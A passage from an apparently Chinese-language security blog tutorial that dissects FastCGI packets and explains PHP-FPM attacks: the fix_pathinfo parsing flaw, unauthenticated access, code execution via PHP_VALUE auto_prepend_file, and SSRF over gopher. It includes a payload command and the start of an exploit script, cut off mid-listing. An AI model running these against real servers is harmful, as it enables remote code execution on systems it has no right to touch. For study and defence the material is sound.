.20.129/</span><br><span class="line">00000400  31 2e 70 68 70 14 0d 48  54 54 50 5f 41 43 43 45   1.php..H TTP_ACCE</span><br><span class="line">00000410  50 54 5f 45 4e 43 4f 44  49 4e 47 67 7a 69 70 2c   PT_ENCOD INGgzip,</span><br><span class="line">00000420  20 64 65 66 6c 61 74 65  14 17 48 54 54 50 5f 41    deflate ..HTTP_A</span><br><span class="line">00000430  43 43 45 50 54 5f 4c 41  4e 47 55 41 47 45 7a 68   CCEPT_LA NGUAGEzh</span><br><span class="line">00000440  2d 43 4e 2c 7a 68 3b 71  3d 30 2e 39 2c 65 6e 3b   -CN,zh;q =0.9,en;</span><br><span class="line">00000450  71 3d 30 2e 38 0b 80 00  00 fa 48 54 54 50 5f 43   q=0.8... ..HTTP_C</span><br><span class="line">00000460  4f 4f 4b 49 45 4a 53 45  53 53 49 4f 4e 49 44 3d   OOKIEJSE SSIONID=</span><br><span class="line">00000470  41 38 44 35 46 42 34 45  45 42 45 41 43 37 34 44   A8D5FB4E EBEAC74D</span><br><span class="line">00000480  42 32 42 37 37 44 41 32  43 31 45 43 35 39 42 42   B2B77DA2 C1EC59BB</span><br><span class="line">00000490  3b 20 50 48 50 53 45 53  53 49 44 3d 32 68 63 74   ; PHPSES SID=2hct</span><br><span class="line">000004A0  70 62 69 63 63 37 66 68  39 32 37 30 6a 6b 62 75   pbicc7fh 9270jkbu</span><br><span class="line">000004B0  6b 63 61 63 62 61 3b 20  73 65 73 73 69 6f 6e 3d   kcacba;  session=</span><br><span class="line">000004C0  65 79 4a 6a 63 33 4a 6d  58 33 52 76 61 32 56 75   eyJjc3Jm X3Rva2Vu</span><br><span class="line">000004D0  49 6a 6f 69 4d 7a 45 34  4d 7a 64 69 59 6d 49 78   IjoiMzE4 MzdiYmIx</span><br><span class="line">000004E0  4e 32 5a 68 4e 6a 46 6d  4d 6a 6b 32 4f 47 45 33   N2ZhNjFm Mjk2OGE3</span><br><span class="line">000004F0  4e 44 51 30 59 7a 6b 78  4d 44 63 32 4e 6a 4a 6c   NDQ0Yzkx MDc2NjJl</span><br><span class="line">00000500  59 57 59 30 4d 6a 5a 6d  5a 69 49 73 49 6d 6c 6b   YWY0MjZm ZiIsImlk</span><br><span class="line">00000510  5a 57 35 30 61 58 52 35  49 6a 6f 69 5a 33 56 6c   ZW50aXR5 IjoiZ3Vl</span><br><span class="line">00000520  63 33 51 69 4c 43 4a 31  63 32 56 79 62 6d 46 74   c3QiLCJ1 c2VybmFt</span><br><span class="line">00000530  5a 53 49 36 49 6d 68 6a  61 69 4a 39 2e 5a 74 32   ZSI6Imhj aiJ9.Zt2</span><br><span class="line">00000540  56 72 41 2e 6d 68 52 5f  5a 67 72 42 35 57 54 50   VrA.mhR_ ZgrB5WTP</span><br><span class="line">00000550  37 31 47 45 71 7a 55 68  36 44 78 56 70 73 59 00   71GEqzUh 6DxVpsY.</span><br><span class="line">00000560  01 04 00 01 00 00 00 00  01 05 00 01 00 03 05 00   ........ ........</span><br><span class="line">00000570  78 3d 31 00 00 00 00 00  01 05 00 01 00 00 00 00   x=1..... ........</span><br></pre></td></tr></table></figure>
+
+<p>在这个包里能看到许多PHP的SERVER全局变量的参数，把包拆分，第一个包为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>其中前8位就是我们上面说的record头,它的意思即：</p>
+<ul>
+<li>version 为 01</li>
+<li>type 为 01，表示这是第一个包</li>
+<li>00 01 表示通信 ID 为 1</li>
+<li>00 08 表示 body 大小为8</li>
+<li>00 00 表示 padding 长度为 0，没有保留字节</li>
+</ul>
+<p>后 8 位则是 body，它的意思是：</p>
+<ul>
+<li><p>00 01 为 role，表示 PHP-FPM 接受我们的 HTTP 所关联的信息，并产生个响应<br>role 的取值如下表：</p>
+<p>| role值 | 具体含义 |<br>| —— | ———————————————————— |<br>| 1 | 最常用的值，php-fpm接受我们的http所关联的信息，并产生个响应 |<br>| 2 | php-fpm会对我们的请求进行认证，认证通过的其会返回响应，认证不通过则关闭请求 |<br>| 3 | 过滤请求中的额外数据流，并产生过滤后的http响应 |</p>
+</li>
+<li><p>00 表示不 keep-alive，在处理完一次请求就关闭</p>
+</li>
+<li><p>五个 00 为保留字段</p>
+</li>
+</ul>
+<p>从数据包我们可以得知这第一个包进行了一些初始设置,再看第二个包:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 04 00 01 05 47 01 00  0c 00 51 55 45 52 59 5f</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>01 为 version</li>
+<li>04 说明在这个包中传递了环境参数</li>
+<li>00 01 为通信 ID</li>
+<li>05 47 说明 body 长度为 0x547，即 1351</li>
+<li>01 00 表示 padding 长度为 1,有1字节的填充数据</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Key</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>QUERY_STRING</code></td>
+<td>(空字符串)</td>
+</tr>
+<tr>
+<td><code>REQUEST_METHOD</code></td>
+<td>POST</td>
+</tr>
+<tr>
+<td><code>CONTENT_TYPE</code></td>
+<td>application&#x2F;x-www-form-urlencoded</td>
+</tr>
+<tr>
+<td><code>CONTENT_LENGTH</code></td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>SCRIPT_NAME</code></td>
+<td>&#x2F;1.php</td>
+</tr>
+<tr>
+<td><code>REQUEST_URI</code></td>
+<td>&#x2F;1.php</td>
+</tr>
+<tr>
+<td><code>DOCUMENT_URI</code></td>
+<td>&#x2F;1.php</td>
+</tr>
+<tr>
+<td><code>DOCUMENT_ROOT</code></td>
+<td>&#x2F;var&#x2F;www&#x2F;html</td>
+</tr>
+<tr>
+<td><code>SERVER_PROTOCOL</code></td>
+<td>HTTP&#x2F;1.1</td>
+</tr>
+<tr>
+<td><code>REQUEST_SCHEME</code></td>
+<td>http</td>
+</tr>
+<tr>
+<td><code>GATEWAY_INTERFACE</code></td>
+<td>CGI&#x2F;1.1</td>
+</tr>
+<tr>
+<td><code>SERVER_SOFTWARE</code></td>
+<td>nginx&#x2F;1.20.2</td>
+</tr>
+<tr>
+<td><code>REMOTE_ADDR</code></td>
+<td>192.168.20.1</td>
+</tr>
+<tr>
+<td><code>REMOTE_PORT</code></td>
+<td>64256</td>
+</tr>
+<tr>
+<td><code>SERVER_ADDR</code></td>
+<td>172.17.0.2</td>
+</tr>
+<tr>
+<td><code>SERVER_PORT</code></td>
+<td>80</td>
+</tr>
+<tr>
+<td><code>SERVER_NAME</code></td>
+<td>localhost</td>
+</tr>
+<tr>
+<td><code>REDIRECT_STATUS</code></td>
+<td>200</td>
+</tr>
+<tr>
+<td><code>SCRIPT_FILENAME</code></td>
+<td>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</td>
+</tr>
+<tr>
+<td><code>HTTP_HOST</code></td>
+<td>192.168.20.129</td>
+</tr>
+<tr>
+<td><code>HTTP_CONNECTION</code></td>
+<td>keep-alive</td>
+</tr>
+<tr>
+<td><code>HTTP_CONTENT_LENGTH</code></td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>HTTP_PRAGMA</code></td>
+<td>no-cache</td>
+</tr>
+<tr>
+<td><code>HTTP_CACHE_CONTROL</code></td>
+<td>no-cache</td>
+</tr>
+<tr>
+<td><code>HTTP_UPGRADE_INSECURE_REQUESTS</code></td>
+<td>1</td>
+</tr>
+<tr>
+<td><code>HTTP_ORIGIN</code></td>
+<td><a target="_blank" rel="noopener" href="http://192.168.20.129/">http://192.168.20.129</a></td>
+</tr>
+<tr>
+<td><code>HTTP_CONTENT_TYPE</code></td>
+<td>application&#x2F;x-www-form-urlencoded</td>
+</tr>
+<tr>
+<td><code>HTTP_USER_AGENT</code></td>
+<td>Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;128.0.0.0 Safari&#x2F;537.36</td>
+</tr>
+<tr>
+<td><code>HTTP_ACCEPT</code></td>
+<td>text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</td>
+</tr>
+<tr>
+<td><code>HTTP_REFERER</code></td>
+<td><a target="_blank" rel="noopener" href="http://192.168.20.129/1.php">http://192.168.20.129/1.php</a></td>
+</tr>
+<tr>
+<td><code>HTTP_ACCEPT_ENCODING</code></td>
+<td>gzip, deflate</td>
+</tr>
+<tr>
+<td><code>HTTP_ACCEPT_LANGUAGE</code></td>
+<td>zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</td>
+</tr>
+<tr>
+<td><code>HTTP_COOKIE</code></td>
+<td>JSESSIONID&#x3D;A8D5FB4EEBEAC74DB2B77DA2C1EC59BB; PHPSESSID&#x3D;2hctpbicc7fh9270jkbukcacba; session&#x3D;eyJjc3JmX3Rva2VuIjoiMzE4MzdiYmIxN2ZhNjFmMjk2OGE3NDQ0YzkxMDc2NjJlYWY0MjZmZiIsImlkZW50aXR5IjoiZ3Vlc3QiLCJ1c2VybmFtZSI6ImhjaiJ9.Zt2VrA.mhR_ZgrB5WTP71GEqzUh6DxVpsY</td>
+</tr>
+<tr>
+<td><code>x</code></td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>可以看到,type4中传递的这些key-value,和phpinfo中看到的那些一样</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240918192134.png" alt="image-20240918192133515" data-caption="image-20240918192133515" loading="lazy"></p>
+<p>实际上,<strong>FPM是一个fastcgi协议解析器</strong>,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好后通过TCP来将请求发送给FPM.<strong>FPM按照fastcgi协议将TCP流解析成真正的数据.</strong></p>
+<p>type4发送的这些其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是<strong>PHP里的环境变量</strong>。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。<br>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php。</p>
+<p>然后再看看最后一个包:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01 04 00 01 00 00 00 00  01 05 00 01 00 03 05 00</span><br><span class="line">78 3d 31 00 00 00 00 00  01 05 00 01 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>前面的应该是环境变量参数包的结尾,后面的是type&#x3D;5,POST提交数据的包头,下面是body和post包的结尾.</p>
+<p>以上这就是一次Fastcgi请求的包了.</p>
+<h1 id="Nginx（IIS7）解析漏洞"><a href="#Nginx（IIS7）解析漏洞" class="headerlink" title="Nginx（IIS7）解析漏洞"></a>Nginx（IIS7）解析漏洞</h1><p>Nginx和IIS7曾经出现过一个PHP相关的解析漏，该漏洞现象是，在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时，访问到的文件是favicon.ico，但却按照.php后缀解析。</p>
+<p>当用户请求<code>http://127.0.0.1/favicon.ico/.php</code>时,nginx会发送如下环境变量到fpm里:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常来说这里SCRIPT_FILENAME访问的是一个不存在的文件,但是PHP设置中有一个选项<strong>fix_pathinfo</strong>导致了</p>
+<p>此漏洞.在这个选项被打开的情况下,fpm会判断SCRIPT_FILENAME是否存在,如果不存在则去掉去掉一个&#x2F;及以后的所有内容,并再次判断文件是否存在,循环类推.</p>
+<p>也因此,在第一次访问&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php时发现不存在,再次查询&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico发现存在,于是被作为php文件执行,导致解析漏洞.</p>
+<p>正确的解决方法有两种，一是在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。</p>
+<h1 id="PHP-FPM未授权访问漏洞"><a href="#PHP-FPM未授权访问漏洞" class="headerlink" title="PHP-FPM未授权访问漏洞"></a>PHP-FPM未授权访问漏洞</h1><p>​	这个漏洞主要是因为<strong>php-fpm对两个进程间通讯没有进行安全性认证</strong>,php-fpm默认监听的是9000端口,如果这个端口暴露在公网上,我们就可以<strong>构造fastcgi协议来和fpm进行通信</strong>,通过构造数据包给环境变量赋值,最终可以达到<strong>任意文件执行</strong>的目的了.</p>
+<p>但是由于在php5.3.9之后加入了fpm增加了<code>security.limit_extensions</code>选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; exectute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions = .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure>
+
+<p>导致限制了只有这几种文件允许被fpm执行,默认是.php.</p>
+<p>由于这个配置项的限制,如果想利用php-fpm的未授权访问漏洞,首先得先找到一个已存在的php文件，不过在安装php的时候，服务器上都会附带一些php后缀的文件，可以使用<code>find / -name &quot;*.php”</code>来搜索一下</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240921191659.png" alt="image-20240921191658496" data-caption="image-20240921191658496" loading="lazy"></p>
+<p>可以看到有个老朋友&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php。</p>
+<h1 id="PHP-FPM任意代码执行"><a href="#PHP-FPM任意代码执行" class="headerlink" title="PHP-FPM任意代码执行"></a>PHP-FPM任意代码执行</h1><p>​	为什么我们前面说控制了fastcgi协议通信的内容，就可以可执行任意php代码呢？	</p>
+<p>理论上确实不行，哪怕我们控制了SCRIPT_FILENAME，也是只能执行目标服务器上的文件，并不能任意代码执行。</p>
+<p>不过php里面有两个配置项可以解决我们的需求，这两个配置项在学习文件包含中也很常见：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong>。</p>
+<p>假如我们设置auto_prepend_file&#x3D;php:&#x2F;&#x2F;input,那么就等于在执行任何php文件前都要包含一遍POST中的内容,所以我们只需要把待执行的代码放在body中,就可以被执行成功了.(不过需要开启远程文件包含选项<strong>allow_url_include</strong>).</p>
+<p>那么我们该如何设置auto_prepend_file的值呢?</p>
+<p>PHP-FPM中有两个环境变量,PHP_VALUE和PHP_ADMIN_VALUE.这两个环境变量就是用来设置php配置选项的,<strong>PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项</strong>，<strong>PHP_ADMIN_VALUE可以设置所有选项</strong>,disable_function这个选项除外,这个是php加载的时候就确定的.</p>
+<p>所以,我们需要最后传入如下环境变量:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>设置<strong>auto_prepend_file &#x3D; php:&#x2F;&#x2F;input</strong>且<strong>allow_url_include &#x3D; On</strong>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p>
+<p>使用P神的脚本<code>python fpm.py 192.168.20.129 /var/www/html/index.php -c &quot;&lt;?php system(&#39;ls /&#39;); exit(); ?&gt;&quot;</code></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240922140138.png" alt="image-20240922140137267" data-caption="image-20240922140137267" loading="lazy"></p>
+<p>完美拿下!</p>
+<h1 id="远程打PHP-FPM"><a href="#远程打PHP-FPM" class="headerlink" title="远程打PHP-FPM"></a>远程打PHP-FPM</h1><p>​	现在我们已经可以通过PHP_VALUE 和 PHP_ADMIN_VALUE 这两个环境变量设置 PHP 配置选项 auto_prepend_file 和 allow_url_include ，从而使 PHP-FPM 执行我们提供的任意代码.如果PHP-FPM被绑定在公网上,那么任何人都可以伪装成中间件来让php-fpm任意代码执行.</p>
+<p>也是使用P神的脚本即可,支持python2与3</p>
+<h1 id="SSRF打PHP-FPM"><a href="#SSRF打PHP-FPM" class="headerlink" title="SSRF打PHP-FPM"></a>SSRF打PHP-FPM</h1><h2 id="使用p神脚本"><a href="#使用p神脚本" class="headerlink" title="使用p神脚本"></a>使用p神脚本</h2><p>p神脚本是生成tcp流后直接发送,只需要把发送那部分注释掉即可,再把生成的tcp流前面加上gopher</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> six.moves.urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bchr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bord</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_text</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastCGIClient</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">       